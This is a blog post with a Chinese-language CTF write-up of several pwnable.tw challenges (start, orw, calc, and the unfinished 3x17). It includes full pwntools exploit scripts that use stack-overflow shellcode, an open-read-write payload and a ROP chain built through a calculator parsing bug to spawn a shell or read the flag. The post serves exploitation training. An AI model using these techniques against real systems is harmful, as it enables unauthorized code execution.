<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Static">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2024/01/23/pwnable_tw_wp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="0x00. startpwnable.tw的第一题，纯汇编写的，逻辑十分简单。没有开启任何保护，全裸程序。 先打印welcome，然后读取0x3c个字符，然后退出。显然漏洞就存在于读取的这个过程，缓冲区大小只有0x14，然后可以栈溢出淹没返回地址。 12345678910111213141516171819202122push    esppush    offset _exitxor     e">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.tw wp">
<meta property="og:url" content="http://example.com/2024/01/23/pwnable_tw_wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="0x00. startpwnable.tw的第一题，纯汇编写的，逻辑十分简单。没有开启任何保护，全裸程序。 先打印welcome，然后读取0x3c个字符，然后退出。显然漏洞就存在于读取的这个过程，缓冲区大小只有0x14，然后可以栈溢出淹没返回地址。 12345678910111213141516171819202122push    esppush    offset _exitxor     e">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-01-23T07:53:13.473Z">
<meta property="article:modified_time" content="2023-12-30T14:01:25.184Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/cat-96.png">
    <!--- Page Info-->
    
    <title>
        
            pwnable.tw wp -
        
        Static&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Static&#39;s blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/chuyin1.jpg","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">

    <div class="navbar-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/cat-96.png">
                </a>
            
            <a class="logo-title" href="/">
                
                Static&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">pwnable.tw wp</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/OIP-C.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-01-23 15:53:13</span>
        <span class="mobile">2024-01-23 15:53:13</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-12-30 22:01:25</span>
            <span class="mobile">2023-12-30 22:01:25</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="0x00-start"><a href="#0x00-start" class="headerlink" title="0x00. start"></a>0x00. start</h2><p>pwnable.tw的第一题，纯汇编写的，逻辑十分简单。没有开启任何保护，全裸程序。</p>
<p>先打印welcome，然后读取0x3c个字符，然后退出。显然漏洞就存在于读取的这个过程，缓冲区大小只有0x14，然后可以栈溢出淹没返回地址。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h</span><br><span class="line">push    20656874h</span><br><span class="line">push    20747261h</span><br><span class="line">push    74732073h</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>

<p>但是程序中没有gadget，不可以ROP，因此就可以想到直接shellcode执行任意代码，但是要如何跳转到栈去执行呢，我们可以通过<code>partial overwrite</code>前面压入的esp的值，然后覆盖返回地址为ret，进而跳转到栈执行shellcode，这里由于ASLR需要爆破栈地址。爆破成功后由于读取内容太少，我在shellcode中调用read继续读取了一次然后执行execve</p>
<p>exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">io</span>):</span><br><span class="line">    io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+asm(<span class="string">&#x27;mov edx, 0x100; mov eax, 3;int 0x80&#x27;</span>).ljust(<span class="number">0xc</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p32(<span class="number">0x804809c</span>)+<span class="string">b&#x27;\x3c&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xc</span>+asm(<span class="string">&#x27;mov ebx, ecx; xor ecx, ecx; xor edx, edx; mov eax, 11; int 0x80&#x27;</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">    <span class="comment">#io = process(&#x27;./start&#x27;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn(io)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<h2 id="0x01-orw"><a href="#0x01-orw" class="headerlink" title="0x01. orw"></a>0x01. orw</h2><p>32位orw题目，直接shellcraft构造就行，本地貌似没法执行bss段代码，但远程可以。注意写上<code>context(arch=&#39;x86&#39;)</code>，因为国内的原因，可能得多打几次</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./orw&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.read(<span class="number">0</span>, <span class="number">0x804a200</span>, <span class="number">0x20</span>))</span><br><span class="line">shellcode += asm(shellcraft.<span class="built_in">open</span>(<span class="number">0x804a200</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, <span class="number">0x804a200</span>, <span class="number">0x50</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x804a200</span>, <span class="number">0x50</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">io.send(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x02-CVE-2018-1160-—-wait-to-solve"><a href="#0x02-CVE-2018-1160-—-wait-to-solve" class="headerlink" title="0x02. CVE-2018-1160 — wait to solve"></a>0x02. CVE-2018-1160 — wait to solve</h2><h2 id="0x03-calc"><a href="#0x03-calc" class="headerlink" title="0x03. calc"></a>0x03. calc</h2><p>先<code>checksec</code>看下，只开了NX和canary。是静态链接程序</p>
<p>IDA看程序，一个计算器程序。<code>bzero</code>清空缓冲区，<code>get_expr</code>获取计算式，<code>init_pool</code>清空v1，<code>parse_expr</code>计算式子。然后来看<code>eval</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl <span class="title function_">eval</span><span class="params">(_DWORD *a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">43</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="number">43</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">45</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] /= (<span class="type">int</span>)a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1;</span><br><span class="line">  --*a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>乍一看，没有任何溢出，但是当输入的第一个符号不是数字时，eval函数就会解析错误，例如输入为<code>+300</code>，那么在calc函数中的printf就会打印出<code>a1[300]</code>的内容，而输入为<code>+300+1</code>的话，就会产生结果<code>a1[300] = a1[300]+1</code>。</p>
<p>因此，只要我们控制好偏移，就可以绕过canary写入ROP链。exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#x86系统调用参数 ebx ecx edx</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./calc&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io, &#x27;b* 0x80494a5&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;=== Welcome to SECPROG calculator ===\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x168</span>).encode())</span><br><span class="line">stack = <span class="number">0x100000000</span>+<span class="built_in">int</span>(io.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">bin_sh = stack+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x171开始布置ROP</span></span><br><span class="line">int_80 = <span class="number">0x08049a21</span></span><br><span class="line">pop_eax = <span class="number">0x805c34b</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x080701d0</span></span><br><span class="line"></span><br><span class="line">payload = [pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, bin_sh, pop_eax, <span class="number">0xb</span>, int_80, <span class="number">0x6e69622f</span>, <span class="number">0x68732f</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    io.sendline(<span class="string">b&quot;+&quot;</span>+<span class="built_in">str</span>(<span class="number">0x171</span>+i).encode())</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvline())</span><br><span class="line">    diff = payload[i]-num</span><br><span class="line">    <span class="keyword">if</span> diff &gt; <span class="number">0x80000000</span>:</span><br><span class="line">        io.sendline(<span class="string">b&quot;+&quot;</span>+<span class="built_in">str</span>(<span class="number">0x171</span>+i).encode()+<span class="string">b&#x27;-&#x27;</span>+<span class="built_in">str</span>(num+<span class="number">0x100000000</span>-payload[i]).encode())</span><br><span class="line">    <span class="keyword">elif</span> diff &gt; <span class="number">0</span>:</span><br><span class="line">        io.sendline(<span class="string">b&quot;+&quot;</span>+<span class="built_in">str</span>(<span class="number">0x171</span>+i).encode()+<span class="string">b&#x27;+&#x27;</span>+<span class="built_in">str</span>(diff).encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(<span class="string">b&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x171</span>+i).encode()+<span class="built_in">str</span>(diff).encode())</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x04-3×17"><a href="#0x04-3×17" class="headerlink" title="0x04. 3×17"></a>0x04. 3×17</h2><p><code>checksec</code>看到只开了NX，静态程序，IDA打开手动给函数加上名称</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = (<span class="type">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line"><span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  v1 = (<span class="type">char</span> *)(<span class="type">int</span>)atoi(buf);</span><br><span class="line">  write(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x18</span>uLL);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这个程序中，我们拥有任意地址写的能力。但要往哪写是个问题，<code>fini_array</code>或许是一个极好的选择，因为在<code>__libc_csu_fini</code>函数中会调用这个数组中的指针，具体逻辑为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_402960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (&amp;unk_4B4100 - (_UNKNOWN *)off_4B40F0) &gt;&gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = ((&amp;unk_4B4100 - (_UNKNOWN *)off_4B40F0) &gt;&gt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      off_4B40F0[v0--]();</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> term_proc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

